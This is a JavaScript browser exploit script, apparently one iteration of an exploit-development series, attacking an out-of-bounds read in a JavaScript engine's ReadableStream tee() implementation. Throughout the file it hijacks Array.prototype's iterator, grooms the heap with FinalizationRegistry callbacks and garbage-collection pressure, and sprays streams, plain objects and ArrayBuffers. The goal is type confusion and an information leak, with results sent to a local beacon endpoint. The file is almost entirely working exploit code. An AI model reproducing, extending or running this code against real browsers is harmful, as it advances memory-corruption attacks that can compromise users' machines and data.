/*
 * V439 -- FR groom with VALID pointers + tee() OOB
 *
 * V438 proved: FR spray lands in OOB read region (crash = deref spray data).
 * Problem: spray values (0x41414141) aren't valid JSObject pointers.
 *
 * Fix: spray actual JS objects that tee's SequenceConverter can safely
 * interpret as InternalReadableStream. The OOB reads results[1] which
 * is a HandleSlot (JSValue*). If the slot contains a pointer to a real
 * JSObject, fromObject() wraps it as InternalReadableStream.
 *
 * Strategy A: spray real ReadableStream objects — if OOB reads one,
 *   it passes all internal checks naturally
 * Strategy B: spray plain objects — fromObject wraps them, operations
 *   fail gracefully (no crash), we detect the confusion
 * Strategy C: spray ArrayBuffers — if wrapped as stream, reading from
 *   it leaks AB internals (length, data pointer = info leak)
 *
 * Beacon prefix: V439-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V439-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

function oobTee(rs) {
  var intercepted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        var items = [self[0]];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };
  var result;
  try { result = rs.tee(); }
  finally { Array.prototype[Symbol.iterator] = origIter; }
  return result;
}

function probe(val) {
  try {
    if (val === null || val === undefined) return "null";
    if (typeof val === "number") return "num:" + val;
    if (typeof val === "string") return "str:" + val.slice(0, 30);
    if (typeof val === "boolean") return "bool:" + val;
    if (typeof val === "object") {
      var name = val.constructor ? val.constructor.name : "?";
      return "obj:" + name;
    }
    return typeof val;
  } catch(e) { return "err:" + e.message.slice(0, 40); }
}

// ================================================================
// Test A: Spray ReadableStream objects into freed region
// If OOB reads a RS, tee wraps it naturally — no crash
// ================================================================
function testA(cb) {
  B("A-START");

  var frDone = false;
  var sprayStreams = [];

  var fr = new FinalizationRegistry(function(held) {
    if (frDone) return; // only handle first batch
    frDone = true;
    B("A-FR-FIRED");

    // Spray ReadableStream objects — these are valid for tee internals
    try {
      for (var i = 0; i < 128; i++) {
        sprayStreams.push(new ReadableStream({
          start: function(c) {
            c.enqueue("SPRAY-" + i);
            c.close();
          }
        }));
      }
      B("A-SPRAYED", sprayStreams.length);
    } catch(e) {
      B("A-SPRAY-ERR", e.message.slice(0,60));
    }
  });

  // Victims: ArrayBuffer(16) — small allocs in same size class as HandleSlot area
  (function() {
    var victims = [];
    for (var i = 0; i < 64; i++) {
      var v = {};
      v["k" + i] = i;
      fr.register(v, "v" + i);
      victims.push(v);
    }
    victims = null;
  })();

  // GC pressure
  var p = [];
  for (var i = 0; i < 500; i++) p.push(new ArrayBuffer(65536));
  p = null;

  function waitAndOOB(round) {
    if (frDone) {
      B("A-OOB-START");

      // Donor tee — puts a 2-HandleSlot Vector on free list
      var donorRS = new ReadableStream({
        start: function(c) { c.enqueue("A-donor"); c.close(); }
      });
      var donorBranches = donorRS.tee();

      // OOB tee
      var oobRS = new ReadableStream({
        start: function(c) { c.enqueue("A-oob"); c.close(); }
      });

      try {
        var result = oobTee(oobRS);
        B("A-RESULT", {len: result.length});

        if (result[1] !== undefined && result[1] !== null) {
          B("A-T1-TYPE", typeof result[1]);
          B("A-T1-PROBE", probe(result[1]));

          if (typeof result[1] === "object") {
            // Check if it's a ReadableStream (from spray) or confused object
            B("A-T1-IS-RS", result[1] instanceof ReadableStream);

            try {
              var locked = result[1].locked;
              B("A-T1-LOCKED", locked);
            } catch(e) { B("A-T1-LOCKED-ERR", e.message.slice(0,60)); }

            try {
              var r = result[1].getReader();
              B("A-T1-READER-OK!!!");
              r.read().then(function(res) {
                B("A-T1-READ!!!", {done: res.done, val: probe(res.value)});
                r.releaseLock();
              }).catch(function(e) { B("A-T1-READ-ERR", e.message.slice(0,60)); });
            } catch(e) { B("A-T1-READER-ERR", e.message.slice(0,60)); }
          }
        } else {
          B("A-T1-EMPTY");
        }
      } catch(e) {
        B("A-OOB-CRASH", e.message.slice(0,80));
      }

      void donorBranches;
      void sprayStreams;
      B("A-DONE");
      if (cb) setTimeout(cb, 2000);
      return;
    }
    if (round > 6) {
      B("A-FR-TIMEOUT");
      if (cb) setTimeout(cb, 500);
      return;
    }
    var p2 = [];
    for (var j = 0; j < 300 + round * 200; j++) p2.push(new ArrayBuffer(65536));
    p2 = null;
    setTimeout(function() { waitAndOOB(round + 1); }, 200);
  }

  setTimeout(function() { waitAndOOB(0); }, 200);
}

// ================================================================
// Test B: Spray plain objects with known properties
// If OOB wraps a plain object as stream, getReader() will throw
// but we survive (no crash) and detect the confusion
// ================================================================
function testB(cb) {
  B("B-START");

  var frDone = false;
  var sprayObjs = [];

  var fr = new FinalizationRegistry(function() {
    if (frDone) return;
    frDone = true;
    B("B-FR-FIRED");

    try {
      for (var i = 0; i < 128; i++) {
        // Plain objects — will be wrapped as InternalReadableStream
        // Operations will throw but NOT crash
        sprayObjs.push({
          marker: 0xBEEF0000 + i,
          idx: i,
          pad0: "BBBBBBBB",
          pad1: "CCCCCCCC"
        });
      }
      B("B-SPRAYED", sprayObjs.length);
    } catch(e) {
      B("B-SPRAY-ERR", e.message.slice(0,60));
    }
  });

  (function() {
    var victims = [];
    for (var i = 0; i < 64; i++) {
      var v = {};
      v["x" + i] = i;
      fr.register(v, "v" + i);
      victims.push(v);
    }
    victims = null;
  })();

  var p = [];
  for (var i = 0; i < 500; i++) p.push(new ArrayBuffer(65536));
  p = null;

  function waitAndOOB(round) {
    if (frDone) {
      B("B-OOB-START");

      var donorRS = new ReadableStream({
        start: function(c) { c.enqueue("B-donor"); c.close(); }
      });
      var donorBranches = donorRS.tee();

      var oobRS = new ReadableStream({
        start: function(c) { c.enqueue("B-oob"); c.close(); }
      });

      try {
        var result = oobTee(oobRS);
        B("B-RESULT", {len: result.length});

        if (result[1] !== undefined && result[1] !== null) {
          B("B-T1-TYPE", typeof result[1]);
          B("B-T1-PROBE", probe(result[1]));
          B("B-T1-IS-RS", result[1] instanceof ReadableStream);

          // Try to access it as a stream — should throw, not crash
          try {
            var locked = result[1].locked;
            B("B-T1-LOCKED", locked);
          } catch(e) { B("B-T1-LOCKED-ERR", e.message.slice(0,60)); }

          try {
            var r = result[1].getReader();
            B("B-T1-READER-OK!!!");
          } catch(e) { B("B-T1-READER-ERR", e.message.slice(0,60)); }

          // If it IS a plain object, try reading our marker
          try {
            if (result[1].marker !== undefined) {
              B("B-T1-MARKER!!!", result[1].marker);
            }
            if (result[1].idx !== undefined) {
              B("B-T1-IDX!!!", result[1].idx);
            }
          } catch(e) { B("B-T1-PROP-ERR", e.message.slice(0,60)); }
        } else {
          B("B-T1-EMPTY");
        }
      } catch(e) {
        B("B-OOB-CRASH", e.message.slice(0,80));
      }

      void donorBranches;
      void sprayObjs;
      B("B-DONE");
      if (cb) setTimeout(cb, 2000);
      return;
    }
    if (round > 6) {
      B("B-FR-TIMEOUT");
      if (cb) setTimeout(cb, 500);
      return;
    }
    var p2 = [];
    for (var j = 0; j < 300 + round * 200; j++) p2.push(new ArrayBuffer(65536));
    p2 = null;
    setTimeout(function() { waitAndOOB(round + 1); }, 200);
  }

  setTimeout(function() { waitAndOOB(0); }, 200);
}

// ================================================================
// Test C: Spray ArrayBuffers — if confused as stream, reading
// it could leak the AB's dataPtr and length (info leak)
// ================================================================
function testC(cb) {
  B("C-START");

  var frDone = false;
  var sprayABs = [];

  var fr = new FinalizationRegistry(function() {
    if (frDone) return;
    frDone = true;
    B("C-FR-FIRED");

    try {
      for (var i = 0; i < 128; i++) {
        var ab = new ArrayBuffer(256);
        var view = new Uint32Array(ab);
        // Fill with recognizable pattern
        view[0] = 0xCAFE0000 + i;
        view[1] = 0xDEAD0000 + i;
        view[2] = 0xF00D0000 + i;
        sprayABs.push(ab);
      }
      B("C-SPRAYED", sprayABs.length);
    } catch(e) {
      B("C-SPRAY-ERR", e.message.slice(0,60));
    }
  });

  (function() {
    var victims = [];
    for (var i = 0; i < 64; i++) {
      var v = {};
      v["z" + i] = i;
      fr.register(v, "v" + i);
      victims.push(v);
    }
    victims = null;
  })();

  var p = [];
  for (var i = 0; i < 500; i++) p.push(new ArrayBuffer(65536));
  p = null;

  function waitAndOOB(round) {
    if (frDone) {
      B("C-OOB-START");

      var donorRS = new ReadableStream({
        start: function(c) { c.enqueue("C-donor"); c.close(); }
      });
      var donorBranches = donorRS.tee();

      var oobRS = new ReadableStream({
        start: function(c) { c.enqueue("C-oob"); c.close(); }
      });

      try {
        var result = oobTee(oobRS);
        B("C-RESULT", {len: result.length});

        if (result[1] !== undefined && result[1] !== null) {
          B("C-T1-TYPE", typeof result[1]);
          B("C-T1-PROBE", probe(result[1]));
          B("C-T1-IS-RS", result[1] instanceof ReadableStream);
          B("C-T1-IS-AB", result[1] instanceof ArrayBuffer);

          // If it's an AB, we can read its contents
          if (result[1] instanceof ArrayBuffer) {
            var v = new Uint32Array(result[1]);
            B("C-T1-AB-LEN!!!", result[1].byteLength);
            B("C-T1-AB-DATA!!!", v[0].toString(16) + "," + v[1].toString(16) + "," + v[2].toString(16));
          }

          // Try stream operations anyway
          try {
            var r = result[1].getReader();
            B("C-T1-READER-OK");
          } catch(e) { B("C-T1-READER-ERR", e.message.slice(0,60)); }

          // Try to enumerate properties — might reveal internal layout
          try {
            var keys = [];
            for (var k in result[1]) { keys.push(k); if (keys.length > 10) break; }
            if (keys.length > 0) B("C-T1-KEYS", keys.join(","));
          } catch(e) { B("C-T1-KEYS-ERR", e.message.slice(0,40)); }
        } else {
          B("C-T1-EMPTY");
        }
      } catch(e) {
        B("C-OOB-CRASH", e.message.slice(0,80));
      }

      void donorBranches;
      void sprayABs;
      B("C-DONE");
      if (cb) setTimeout(cb, 2000);
      return;
    }
    if (round > 6) {
      B("C-FR-TIMEOUT");
      if (cb) setTimeout(cb, 500);
      return;
    }
    var p2 = [];
    for (var j = 0; j < 300 + round * 200; j++) p2.push(new ArrayBuffer(65536));
    p2 = null;
    setTimeout(function() { waitAndOOB(round + 1); }, 200);
  }

  setTimeout(function() { waitAndOOB(0); }, 200);
}

// ================================================================
// Test D: No-spray control — just donor + OOB without grooming
// to see what's naturally in the OOB region
// ================================================================
function testD(cb) {
  B("D-START");

  var donorRS = new ReadableStream({
    start: function(c) { c.enqueue("D-donor"); c.close(); }
  });
  var donorBranches = donorRS.tee();

  var oobRS = new ReadableStream({
    start: function(c) { c.enqueue("D-oob"); c.close(); }
  });

  try {
    var result = oobTee(oobRS);
    B("D-RESULT", {len: result.length});

    if (result[1] !== undefined && result[1] !== null) {
      B("D-T1-TYPE", typeof result[1]);
      B("D-T1-PROBE", probe(result[1]));
    } else {
      B("D-T1-EMPTY");
    }
  } catch(e) {
    B("D-OOB-CRASH", e.message.slice(0,80));
  }

  void donorBranches;
  B("D-DONE");
  if (cb) setTimeout(cb, 1000);
}

// ================================================================
// Run: D first (control), then A, B, C
// ================================================================
testD(function() {
  testA(function() {
    testB(function() {
      testC(function() {
        B("ALL-DONE");
      });
    });
  });
});

})();
